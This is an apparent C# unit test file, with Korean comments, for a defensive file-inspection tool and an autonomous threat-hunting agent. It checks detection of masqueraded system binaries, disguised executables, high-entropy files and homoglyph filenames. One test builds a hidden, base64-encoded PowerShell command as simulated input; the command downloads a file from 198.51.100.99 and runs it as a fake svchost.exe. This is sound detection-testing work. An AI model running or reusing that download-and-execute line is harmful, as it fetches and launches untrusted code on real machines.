using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;

namespace Phalanx.Agent.Tests;

public class FileInspectionToolTests
{
    private readonly FileInspectionTool _tool = new();

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_RealSystemBinary_VerifiedSigned()
    {
        // 1. Arrange: 윈도우 실제 핵심 바이너리 (C:\Windows\System32\svchost.exe)
        string sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string svchostPath = Path.Combine(sysDir, "svchost.exe");

        if (!File.Exists(svchostPath))
        {
            // 비Windows 또는 특수 환경 가드
            return;
        }

        // 2. Act
        var result = await _tool.ExecuteAsync(new() { ["filePath"] = svchostPath });

        // 3. Assert
        Assert.True(result.Success);
        Assert.NotNull(result.Data);

        Assert.True((bool)result.Data["Exists"]);
        Assert.True((bool)result.Data["IsSigned"]);
        Assert.False((bool)result.Data["IsPathMasqueraded"]);
        Assert.False((bool)result.Data["IsDisguisedExecutable"]);

        string status = (string)result.Data["SignatureStatus"];
        Assert.Contains("Valid", status);

        string subject = (string)result.Data["SignerSubject"];
        Assert.Contains("Microsoft", subject);

        int score = (int)result.Data["AnomalyScore"];
        Assert.Equal(0, score);
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_MasqueradedTempBinary_AnomalyScore100()
    {
        // 1. Arrange: Temp 디렉터리에 가짜 무서명 svchost.exe 생성
        string tempDir = Path.GetTempPath();
        string fakeSvchost = Path.Combine(tempDir, $"fake_svchost_{Guid.NewGuid():N}.exe");

        // 유효하지 않은 임의 바이트 작성 (무서명)
        byte[] dummyBytes = Encoding.UTF8.GetBytes("MZ_DUMMY_BINARY_PAYLOAD_NOT_SIGNED");
        await File.WriteAllBytesAsync(fakeSvchost, dummyBytes);

        // 테스트를 위해 시스템 바이너리 파일명 규칙 검증용 경로 생성
        string masqueradedPath = Path.Combine(tempDir, "svchost.exe");
        try
        {
            File.Copy(fakeSvchost, masqueradedPath, overwrite: true);

            // 2. Act
            var result = await _tool.ExecuteAsync(new() { ["filePath"] = masqueradedPath });

            // 3. Assert
            Assert.True(result.Success);
            Assert.NotNull(result.Data);

            Assert.True((bool)result.Data["Exists"]);
            Assert.False((bool)result.Data["IsSigned"]);
            Assert.True((bool)result.Data["IsPathMasqueraded"]);

            int score = (int)result.Data["AnomalyScore"];
            Assert.Equal(100, score); // 무서명 시스템 경로 위장은 즉시 100점
            Assert.Contains("T1036.005", (string)result.Data["DiagnosticReason"]);
        }
        finally
        {
            try { File.Delete(fakeSvchost); } catch { }
            try { File.Delete(masqueradedPath); } catch { }
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_DisguisedExecutable_Detected()
    {
        // 1. Arrange: .dat 확장자이나 내부에 유효한 MZ 및 PE\0\0 헤더를 가진 파일 작성
        string tempFile = Path.Combine(Path.GetTempPath(), $"update_{Guid.NewGuid():N}.dat");

        byte[] fakePe = new byte[256];
        // DOS Header: MZ
        fakePe[0] = 0x4D;
        fakePe[1] = 0x5A;
        // e_lfanew at 0x3C = 0x80 (128)
        BitConverter.GetBytes(0x80).CopyTo(fakePe, 0x3C);
        // PE Signature at 0x80: 'P', 'E', 0, 0
        fakePe[0x80] = 0x50;
        fakePe[0x81] = 0x45;
        fakePe[0x82] = 0x00;
        fakePe[0x83] = 0x00;

        await File.WriteAllBytesAsync(tempFile, fakePe);

        try
        {
            // 2. Act
            var result = await _tool.ExecuteAsync(new() { ["filePath"] = tempFile });

            // 3. Assert
            Assert.True(result.Success);
            Assert.NotNull(result.Data);

            Assert.True((bool)result.Data["Exists"]);
            Assert.True((bool)result.Data["IsDisguisedExecutable"]);

            int score = (int)result.Data["AnomalyScore"];
            Assert.True(score >= 40, $"이상 징후 점수가 40점 이상이어야 함: {score}");
        }
        finally
        {
            try { File.Delete(tempFile); } catch { }
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_HighEntropyPacked_Detected()
    {
        // 1. Arrange: 64KB 고엔트로피 난수 파일 생성 (> 7.2)
        string tempFile = Path.Combine(Path.GetTempPath(), $"payload_{Guid.NewGuid():N}.bin");
        byte[] randomBytes = new byte[65536];
        RandomNumberGenerator.Fill(randomBytes);

        await File.WriteAllBytesAsync(tempFile, randomBytes);

        try
        {
            // 2. Act
            var result = await _tool.ExecuteAsync(new() { ["filePath"] = tempFile });

            // 3. Assert
            Assert.True(result.Success);
            Assert.NotNull(result.Data);

            double entropy = (double)result.Data["Entropy"];
            Assert.True(entropy > 7.2, $"난수 바이트의 엔트로피가 7.2 초과여야 함: {entropy}");

            int score = (int)result.Data["AnomalyScore"];
            Assert.True(score >= 25, $"고엔트로피로 인한 위험도 가산 확인: {score}");
        }
        finally
        {
            try { File.Delete(tempFile); } catch { }
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_ZeroByteFile_HandledGracefully()
    {
        // 1. Arrange: 0바이트 빈 파일 생성 (Division by Zero NaN 방어 검증)
        string emptyFile = Path.Combine(Path.GetTempPath(), $"empty_{Guid.NewGuid():N}.tmp");
        await File.WriteAllBytesAsync(emptyFile, Array.Empty<byte>());

        try
        {
            // 2. Act
            var result = await _tool.ExecuteAsync(new() { ["filePath"] = emptyFile });

            // 3. Assert
            Assert.True(result.Success);
            Assert.NotNull(result.Data);

            Assert.True((bool)result.Data["Exists"]);
            Assert.Equal(0L, (long)result.Data["FileSizeBytes"]);

            double entropy = (double)result.Data["Entropy"];
            Assert.Equal(0.0, entropy);
            Assert.False(double.IsNaN(entropy));
            Assert.False((bool)result.Data["IsDisguisedExecutable"]);
        }
        finally
        {
            try { File.Delete(emptyFile); } catch { }
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_MissingAndInvalidArgs_HandledGracefully()
    {
        // 1. 빈 인자 전달 시
        var res1 = await _tool.ExecuteAsync(new Dictionary<string, object>());
        Assert.False(res1.Success);
        Assert.Contains("누락", res1.Output);

        // 2. 존재하지 않는 파일 경로 전달 시
        string nonExistent = @"C:\NonExistent_Directory_12345\missing_file.exe";
        var res2 = await _tool.ExecuteAsync(new() { ["filePath"] = nonExistent });

        Assert.True(res2.Success);
        Assert.NotNull(res2.Data);
        Assert.False((bool)res2.Data["Exists"]);
        Assert.Equal("FileNotFound", (string)res2.Data["SignatureStatus"]);
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_SimulatedFileEntry_CleanRoom()
    {
        // 1. Arrange: 가상 모의 엔트리 주입
        string mockPath = @"C:\Windows\Temp\mock_malware.exe";
        var mockEntry = new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 204800L,
            Sha256: "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
            Entropy: 7.8912,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (Simulated)",
            IsPathMasqueraded: true,
            IsDisguisedExecutable: false,
            AnomalyScore: 100,
            DiagnosticReason: "모의 Clean-Room 위장 바이너리 검증"
        );

        FileInspectionTool.RegisterSimulatedFile(mockPath, mockEntry);

        try
        {
            // 2. Act
            var result = await _tool.ExecuteAsync(new() { ["filePath"] = mockPath });

            // 3. Assert
            Assert.True(result.Success);
            Assert.NotNull(result.Data);

            Assert.True((bool)result.Data["Exists"]);
            Assert.Equal(204800L, (long)result.Data["FileSizeBytes"]);
            Assert.Equal(7.8912, (double)result.Data["Entropy"]);
            Assert.True((bool)result.Data["IsPathMasqueraded"]);
            Assert.Equal(100, (int)result.Data["AnomalyScore"]);
            Assert.Contains("Clean-Room Simulation", result.Output);
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }

        // 초기화 후 조회 시 실제 디스크(없음)로 폴백 검증
        var afterClear = await _tool.ExecuteAsync(new() { ["filePath"] = mockPath });
        Assert.True(afterClear.Success);
        Assert.False((bool)afterClear.Data!["Exists"]);
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestConvolutedEvasiveAttack_WithFileInspectionTool_ImmediateMasqueradingDetectionAndKill()
    {
        // 1. Arrange: 복합 회피 공격 (미등록 IP 198.51.100.99 + C:\Windows\Temp\svchost.exe 위장 드롭)
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool(),
            new FileInspectionTool(),
            new RegistryInspectionTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);

        string targetFilePath = @"C:\Windows\Temp\svchost.exe";
        FileInspectionTool.RegisterSimulatedFile(targetFilePath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 124928L,
            Sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            Entropy: 7.4521,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: true,
            IsDisguisedExecutable: false,
            AnomalyScore: 100,
            DiagnosticReason: "시스템 핵심 바이너리 파일명이 비인가 디렉터리(Temp)에 위치하며 유효한 Microsoft 서명이 결여됨 (T1036.005 Masquerading)"
        ));

        try
        {
            // 부모: explorer.exe (정상 윈도우 셸)
            treeManager.ApplySnapshotBatch(new[]
            {
                new ProcessEvent
                {
                    ProcessId = 5001,
                    ImageName = "explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                }
            });

            // 타깃: powershell.exe -w hidden -enc <미등록 IP 198.51.100.99로부터 update.dat를 받아 C:\Windows\Temp\svchost.exe로 저장 및 실행>
            string evasiveScript = "$u='http://198.51.100.99/update.dat'; $p='C:\\Windows\\Temp\\svchost.exe'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(evasiveScript));
            string fullCmd = $"powershell.exe -w hidden -enc {b64}";

            treeManager.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = 5002,
                ParentProcessId = 5001,
                ImageName = "powershell.exe",
                CommandLine = fullCmd,
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var targetNode = treeManager.FindActiveNodeByPid(5002);
            Assert.NotNull(targetNode);

            // 2. Act: 자율 수사관 실행
            var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);

            // 3. Assert: 즉각적인 Masquerading 탐지 및 ACTION_KILL 판결 검증
            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
            Assert.Contains("Masquerading", res.SummaryTitle, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("T1036.005", res.MitreTactics);

            // FileInspectionTool이 수사 루프에 개입하여 위장을 포착했는지 검증
            var fileInspectionTrace = res.Traces.Find(t => t.ActionTool == "FileInspectionTool");
            Assert.NotNull(fileInspectionTrace);
            Assert.Contains("T1036.005", fileInspectionTrace.Observation);

            // 악성 C2 IP 방화벽 차단 연계 검증
            Assert.Equal("198.51.100.99", res.BlockedIp);
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public void TestFileInspection_GetUnicodeSkeleton_NormalizesCyrillicAndGreek()
    {
        // 1. Cyrillic small 'е' (U+0435) -> explorer.exe
        Assert.Equal("explorer.exe", FileInspectionTool.GetUnicodeSkeleton("\u0435xplorer.exe"));

        // 2. Cyrillic small 'о' (U+043E) -> svchost.exe
        Assert.Equal("svchost.exe", FileInspectionTool.GetUnicodeSkeleton("svch\u043Est.exe"));

        // 3. Cyrillic small 'ѕ' (U+0455) -> svchost.exe
        Assert.Equal("svchost.exe", FileInspectionTool.GetUnicodeSkeleton("svcho\u0455t.exe"));

        // 4. Greek small 'τ' (U+03C4) -> svchost.exe
        Assert.Equal("svchost.exe", FileInspectionTool.GetUnicodeSkeleton("svchos\u03C4.exe"));

        // 5. Cyrillic small 'к' (U+043A) + Greek small 'ω' (U+03C9) -> taskhostw.exe
        Assert.Equal("taskhostw.exe", FileInspectionTool.GetUnicodeSkeleton("tas\u043Ahost\u03C9.exe"));

        // 6. 빈 문자열 및 정상 ASCII 보존
        Assert.Equal(string.Empty, FileInspectionTool.GetUnicodeSkeleton(string.Empty));
        Assert.Equal("normal_binary.exe", FileInspectionTool.GetUnicodeSkeleton("normal_binary.exe"));
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_UnicodeHomoglyphInSystem32_DetectedAsMasqueradedAndScore100()
    {
        // Arrange
        string homoglyphExe = "svch\u043Est.exe";
        string homoglyphPath = @"C:\Windows\System32\" + homoglyphExe;
        var entry = FileInspectionTool.CreateSimulatedEntry(
            filePath: homoglyphPath,
            exists: true,
            fileSizeBytes: 142336L,
            sha256: "9999999999999999999999999999999999999999999999999999999999999999",
            entropy: 7.4210,
            isSigned: false,
            signerSubject: string.Empty,
            signatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)"
        );

        FileInspectionTool.RegisterSimulatedFile(homoglyphPath, entry);

        try
        {
            // Act
            var res = await _tool.ExecuteAsync(new() { ["filePath"] = homoglyphPath });

            // Assert
            Assert.True(res.Success);
            Assert.NotNull(res.Data);
            Assert.True((bool)res.Data["IsPathMasqueraded"]);
            Assert.Equal(100, (int)res.Data["AnomalyScore"]);
            string reason = (string)res.Data["DiagnosticReason"];
            Assert.Contains("UTR #39", reason);
            Assert.Contains("T1036.005", reason);
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestFileInspection_UnsignedBinaryInSystem32_ZeroTrustViolation_Score70()
    {
        // Arrange: System32 내부에 위치하나 시스템 핵심 바이너리명이 아닌 임의의 무서명 도구
        string unsignedSystemPath = @"C:\Windows\System32\custom_internal_tool.exe";
        var entry = FileInspectionTool.CreateSimulatedEntry(
            filePath: unsignedSystemPath,
            exists: true,
            fileSizeBytes: 524288L,
            sha256: "1111111111111111111111111111111111111111111111111111111111111111",
            entropy: 6.1023,
            isSigned: false,
            signerSubject: string.Empty,
            signatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)"
        );

        FileInspectionTool.RegisterSimulatedFile(unsignedSystemPath, entry);

        try
        {
            // Act
            var res = await _tool.ExecuteAsync(new() { ["filePath"] = unsignedSystemPath });

            // Assert
            Assert.True(res.Success);
            Assert.NotNull(res.Data);
            Assert.False((bool)res.Data["IsPathMasqueraded"]); // 위장 사칭은 아님
            Assert.True((int)res.Data["AnomalyScore"] >= 70); // System32 Zero Trust 위반으로 최소 70점
            string reason = (string)res.Data["DiagnosticReason"];
            Assert.Contains("System32 Zero Trust", reason);
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }
}
